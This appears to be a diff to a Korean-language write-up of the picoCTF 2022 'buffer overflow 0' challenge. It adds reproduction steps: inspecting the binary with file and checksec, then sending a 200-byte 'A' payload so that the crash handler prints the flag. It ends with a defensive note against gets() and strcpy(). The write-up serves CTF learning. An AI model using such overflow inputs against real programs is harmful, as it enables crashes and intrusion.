@@ -1,7 +1,7 @@
 ---
 title: buffer overflow 0 — picoCTF 2022 pwn writeup
 created: 2026-06-15
-updated: 2026-06-15
+updated: 2026-06-16
 type: query
 tags: [ctf, pwn, buffer-overflow, gets, strcpy, sigsegv, picoctf]
 sources: [https://medium.com/@muranyi.levente/picoctf-2022-buffer-overflow-0-f26e5fc9b31e, https://dev.to/shalintha/exploiting-buffer-overflow-0-step-by-step-picoctf-walkthrough-p83, https://medium.com/@hchilcote/picoctf-buffer-overflow-0-write-up-82dc8ea3bea0]
@@ -65,6 +65,22 @@ io.sendlineafter(b':', payload)  # 입력을 보냅니다.
 print(io.recvall().decode(errors='replace'))
 ```
 
+
+## 재현 절차
+
+1. 실행 파일 형식과 보호기법을 확인합니다.
+```bash
+# 32-bit x86 여부와 보호기법을 먼저 확인합니다.
+file ./vuln              # 예상: ELF 32-bit LSB executable
+checksec --file=./vuln    # 예상: NX / Canary / PIE 상태가 출력됩니다.
+```
+2. 긴 입력으로 의도적 크래시를 유도합니다.
+```python
+# 긴 페이로드를 만들어 segfault를 유도합니다.
+payload = b"A" * 200     # 예상: 버퍼 overflow가 발생합니다.
+print(payload.decode())   # 예상: A가 200개 출력됩니다.
+```
+3. 크래시 이후 `sigsegv_handler`가 flag를 출력하는지 확인합니다.
 ## 6. 방어 관점 메모
 
 - `gets()`와 `strcpy()`는 즉시 제거해야 합니다.
